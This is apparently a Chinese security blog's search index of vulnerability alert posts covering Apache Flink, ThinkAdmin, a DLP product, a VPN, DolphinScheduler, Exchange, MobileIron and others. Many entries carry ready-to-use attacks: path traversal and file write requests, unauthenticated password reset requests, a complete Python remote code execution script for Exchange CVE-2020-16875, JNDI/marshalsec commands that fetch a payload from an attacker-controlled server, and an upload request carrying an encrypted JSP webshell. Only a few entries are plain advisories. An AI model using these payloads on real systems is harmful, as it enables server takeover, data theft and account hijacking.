<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Flink目录遍历漏洞(CVE-2020-17518/CVE-2020-17519)</title>
    <url>/2021/01/06/Apache%20Flink%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E(CVE-2020-17518CVE-2020-17519)/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>2021年1月5日，Apache官网通报了Apache Flink目录遍历漏洞，可通过REST API读/写远程文件。</p>
<p>CVE-2020-17518:构造恶意http header，可实现远程文件写入。Flink1.5.1引入了一个REST处理程序，允许您编写文件到本地文件系统上的任意位置。</p>
<p>CVE-2020-17519:通过REST API使用../跳目录实现系统任意文件读取。Apache Flink 1.11.0-1.11.2中引入的一项更改，允许攻击者通过JobManager进程的REST接口读取本地文件系统上的任何文件，访问仅限于JobManager进程可访问的文件。</p>
<p><img src="01.png" alt="图片"></p>
<p><img src="02.png" alt="02"></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>CVE-2020-17518：Flink 1.5.1 - 1.11.2</p>
<p>CVE-2020-17519：Flink 1.11.0 、1.11.1 、1.11.2</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><p>cve-2020-17518:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jars/upload</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line"><span class="attribute">Content-Length</span>: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="exploit"; filename="../../../../../../tmp/exploit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">exploit</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span></span><br></pre></td></tr></table></figure>

<p>cve-2020-17519：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">*/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>



<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><p>升级Apache Flink至安全版本Flink 1.11.3或Flink 1.12.0。</p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>深x服SSL VPN命令注入漏洞</title>
    <url>/2020/12/31/%E6%B7%B1X%E6%9C%8DSSL%20VPN%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>2020年12月30日，网上发布了<code>SSL VPN 命令注入漏洞</code>的风险通告，该漏洞暂无编号 ，漏洞等级：<code>高危</code></p>
<p>深信服<code>SSL VPN</code>产品的某接口中<code>url</code>参数存在注入漏洞，攻击者可利用该漏洞获取<code>SSL VPN</code>设备的控制权限。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>深信服:SSL VPN: &lt;=7.6.7</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到SSL VPN 7.6.7以上版本或安装最新安全补丁包，用户可以利用深信服提供的漏洞查询链接进行自查：<a href="https://www.sangfor.com.cn/technical-support-and-service/security-centre/sec-check" target="_blank" rel="noopener">漏洞查询入口</a></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkadmin v6任意文件读取漏洞(CVE-2020-25540)</title>
    <url>/2020/09/25/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/</url>
    <content><![CDATA[<h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>ThinkAdmin  是一套基于ThinkPHP框架的通用后台管理系统,依赖自制组件 ThinkLibrary ，ThinkLibrary 是针对 ThinkPHP 定制开发。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>ThinkAdmin 6版本存在路径遍历漏洞。攻击者可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件。</p>
<p><a href="https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php" target="_blank" rel="noopener">https://github.com/zoujingli/ThinkAdmin/blob/v6/app/admin/controller/api/Update.php</a></p>
<p>Update.php中的函数方法未授权，导致函数可直接调用。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Thinkadmin版本 ≤ 2020.08.03.01</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>POC</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin.html?s=admin/api.Update/node</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span>: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 22</span><br><span class="line"></span><br><span class="line">rules=%5B%22.%2F%22%5D</span><br></pre></td></tr></table></figure>

<p><img src="0.png" alt="0"></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>天X信数据防泄漏系统越权修改密码漏洞</title>
    <url>/2020/09/19/%E5%A4%A9X%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>天X信网络数据防泄漏系统（TopDLP-N）以深度内容识别技术为核心，采用独有的网络抓包技术、数据深度分析、协议内容解析、文件内容还原等技术、综合运用各种先进的检测算法，对单位内部用户邮件客户端（SMTP）、浏览器（HTTP/S）、FTP客户端（FTP）、网络共享（SMB）等途径传输的数据进行解析和内容提取，识别敏感数据，依据预先定义策略执行防护措施，进而达到敏感数据防护的目的。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。</p>
<p>默认superman账户uid为1。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd </span><br><span class="line"><span class="attribute">Cookie</span>: username=superman;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>深x服某PN存在任意重置绑定手机号漏洞</title>
    <url>/2020/09/18/%E6%B7%B1X%E6%9C%8D%E6%9F%90PN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E9%87%8D%E7%BD%AE%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>条件：需要登录</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://url/por/changetelnum.csp?apiversion=1newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>Wordpress File-manager 任意文件上传漏洞</title>
    <url>/2020/09/18/Wordpress%20File-manager%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="File-Manager-插件介绍"><a href="#File-Manager-插件介绍" class="headerlink" title="File Manager 插件介绍"></a>File Manager 插件介绍</h2><p>WordPress文件管理器插件File Manager 为您提供编辑、删除、上载、下载、复制和粘贴文件和文件夹的功能。您可以轻松地将文件夹或任何文件从一个位置复制，移动到另一个位置。File Manager 插件分为免费版本和收费版本</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>file manager 6.0-6.8</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上传phpinfo</p>
<p><img src="0.png" alt="0"></p>
<p>访问<a href="http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank" rel="noopener">http://127.0.0.1/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p>
<p><img src="1.png" alt="1"></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>两个Apache DolphinScheduler高危漏洞</title>
    <url>/2020/09/18/%E4%B8%A4%E4%B8%AAApache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%20/</url>
    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>Apache  DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p>
<h2 id="一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"><a href="#一、Apache-DolphinScheduler权限覆盖漏洞（CVE-2020-13922）" class="headerlink" title="一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）"></a>一、Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）</h2><h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>该漏洞导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update。</p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Apache DolphinScheduler    1.2.0</p>
<p>Apache DolphinScheduler    1.2.1</p>
<p>Apache DolphinScheduler    1.3.1</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心。</p>
<p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p>
<p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dolphinscheduler/datasources/connect</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">type=MYSQL&amp;name=test&amp;note=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;</span><br><span class="line"></span><br><span class="line">principal=&amp;userName=root&amp;password=root&amp;connectType=&amp;</span><br><span class="line"></span><br><span class="line">other=&#123;"detectCustomCollations":true,"autoDeserialize":true&#125;</span><br></pre></td></tr></table></figure>

<h2 id="二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"><a href="#二、Apache-DolphinScheduler远程执行代码漏洞（CVE-2020-11974）" class="headerlink" title="二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）"></a>二、Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）</h2><h3 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h3><p>该漏洞与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc  connect参数输入{“detectCustomCollations”:true,”autoDeserialize”:true}在DolphinScheduler 服务器上远程执行代码。</p>
<h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><p>Apache DolphinScheduler  1.2.0</p>
<p>Apache DolphinScheduler  1.2.1</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>尽快升级版本至1.3.2进行防护，官方下载链接：</p>
<p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html" target="_blank" rel="noopener">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>Exchange Server 远程代码执行漏洞(CVE-2020-16875)</title>
    <url>/2020/09/18/Exchange%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-16875)/</url>
    <content><![CDATA[<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>由于对cmdlet参数的验证不正确，Microsoft Exchange服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个Exchange角色进行身份验证的用户权限。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>microsoft:exchange_server_2016: cu16/cu17</p>
<p>microsoft:exchange_server_2019: cu5/cu6</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_string</span><span class="params">(str_len=<span class="number">8</span>)</span>:</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(letters) <span class="keyword">for</span> i <span class="keyword">in</span> range(str_len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_xml</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">&lt;dlpPolicyTemplates&gt;</span></span><br><span class="line"><span class="string">  &lt;dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0"&gt;</span></span><br><span class="line"><span class="string">    &lt;contentVersion&gt;4&lt;/contentVersion&gt;</span></span><br><span class="line"><span class="string">    &lt;publisherName&gt;si&lt;/publisherName&gt;</span></span><br><span class="line"><span class="string">    &lt;name&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/name&gt;</span></span><br><span class="line"><span class="string">    &lt;description&gt;</span></span><br><span class="line"><span class="string">      &lt;localizedString lang="en"&gt;&lt;/localizedString&gt;</span></span><br><span class="line"><span class="string">    &lt;/description&gt;</span></span><br><span class="line"><span class="string">    &lt;keywords&gt;&lt;/keywords&gt;</span></span><br><span class="line"><span class="string">    &lt;ruleParameters&gt;&lt;/ruleParameters&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommands&gt;</span></span><br><span class="line"><span class="string">      &lt;commandBlock&gt;</span></span><br><span class="line"><span class="string">        &lt;![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]&gt;</span></span><br><span class="line"><span class="string">      &lt;/commandBlock&gt;</span></span><br><span class="line"><span class="string">    &lt;/policyCommands&gt;</span></span><br><span class="line"><span class="string">    &lt;policyCommandsResources&gt;&lt;/policyCommandsResources&gt;</span></span><br><span class="line"><span class="string">  &lt;/dlpPolicyTemplate&gt;</span></span><br><span class="line"><span class="string">&lt;/dlpPolicyTemplates&gt;"""</span> % c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_rce</span><span class="params">(t, s, vs, cmd)</span>:</span></span><br><span class="line">    f = &#123;</span><br><span class="line">        <span class="string">'__VIEWSTATE'</span>: (<span class="literal">None</span>, vs),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$senderBtn'</span>: (<span class="literal">None</span>, <span class="string">"ResultPanePlaceHolder_ButtonsPanel_btnNext"</span>),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$name'</span>: (<span class="literal">None</span>, random_string()),</span><br><span class="line">        <span class="string">'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl'</span>: (<span class="string">"dlprce.xml"</span>, get_xml(cmd)),</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, files=f, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">"(-) failed to trigger rce!"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_viewstate</span><span class="params">(t, s)</span>:</span></span><br><span class="line">    r = s.get(<span class="string">"https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx"</span> % t, verify=<span class="literal">False</span>)</span><br><span class="line">    match = re.search(<span class="string">"&lt;input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" /&gt;"</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the __viewstate!"</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in</span><span class="params">(t, usr, pwd)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    d = &#123;</span><br><span class="line">        <span class="string">"destination"</span> : <span class="string">"https://%s/owa"</span> % t,</span><br><span class="line">        <span class="string">"flags"</span> : <span class="string">""</span>,</span><br><span class="line">        <span class="string">"username"</span> : usr,</span><br><span class="line">        <span class="string">"password"</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(<span class="string">"https://%s/owa/auth.owa"</span> % t, data=d, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">assert</span> s.cookies.get(name=<span class="string">'X-OWA-CANARY'</span>) != <span class="literal">None</span>, <span class="string">"(-) couldn't leak the csrf canary!"</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(t, usr, pwd, cmd)</span>:</span></span><br><span class="line">    s = log_in(t, usr, pwd)</span><br><span class="line">    print(<span class="string">"(+) logged in as %s"</span> % usr)</span><br><span class="line">    vs = leak_viewstate(t, s)</span><br><span class="line">    print(<span class="string">"(+) found the __viewstate: %s"</span> % vs)</span><br><span class="line">    trigger_rce(t, s, vs, cmd)</span><br><span class="line">    print(<span class="string">"(+) executed %s as SYSTEM!"</span> % cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">"(+) usage: %s &lt;target&gt; &lt;user:pass&gt; &lt;cmd&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">"(+) eg: %s 192.168.1.1 user123:123456 calc"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">-1</span>)</span><br><span class="line">    trgt = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">":"</span> <span class="keyword">in</span> sys.argv[<span class="number">2</span>], <span class="string">"(-) you need a user and password!"</span></span><br><span class="line">    usr = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    pwd = sys.argv[<span class="number">2</span>].split(<span class="string">":"</span>)[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    main(trgt, usr, pwd, cmd)</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>补丁：<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-16875</a></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>NetLogon特权提升漏洞(CVE-2020-1472)</title>
    <url>/2020/09/15/NetLogon%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E(CVE-2020-1472)/</url>
    <content><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
<li>Windows Server 2012</li>
<li>Windows Server 2012 (Server Core installation)</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2012 R2 (Server Core installation)</li>
<li>Windows Server 2016 </li>
<li>Windows Server 2016 (Server Core installation)</li>
<li>Windows Server 2019</li>
<li>Windows Server 2019 (Server Core installation)</li>
<li>Windows Server, version 1903 (Server Core installation)</li>
<li>Windows Server, version 1909 (Server Core installation)</li>
<li>Windows Server, version 2004 (Server Core installation)</li>
</ul>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472</a></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>MobileIronMDM 未授权RCE</title>
    <url>/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/</url>
    <content><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1</span>.<span class="number">0</span>-SNAPSHOT-all.jar -A <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> -C "&lt;Command&gt;"</span><br><span class="line">java -cp ./marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:<span class="number">1099</span>/&lt;codebase&gt; &gt; exp</span><br><span class="line">python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'</span><br></pre></td></tr></table></figure>

<p><img src="0.png" alt="0"></p>
<p><img src="1.png" alt="1"></p>
]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>2020HW第三弹</title>
    <url>/2020/09/13/2020HW%E7%AC%AC%E4%B8%89%E5%BC%B9/</url>
    <content><![CDATA[<h2 id="联软科技产品存在任意文件上传和命令执行漏洞："><a href="#联软科技产品存在任意文件上传和命令执行漏洞：" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞："></a>联软科技产品存在任意文件上传和命令执行漏洞：</h2><h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。（猜测利用黑名单的其他后缀名绕过）</p>
<p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line"></span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"></span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="xxxxxxxxxxxxxxxx";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞告警</category>
      </categories>
      <tags>
        <tag>告警信息</tag>
      </tags>
  </entry>
  <entry>
    <title>2020HW第二弹</title>
    <url>/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/</url>
    <content><![CDATA[<h2 id="PAN-OS远程代码执行漏洞（CVE-2020-2040）"><a href="#PAN-OS远程代码执行漏洞（CVE-2020-2040）" class="headerlink" title="PAN-OS远程代码执行漏洞（CVE-2020-2040）"></a>PAN-OS远程代码执行漏洞（CVE-2020-2040）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。</p>
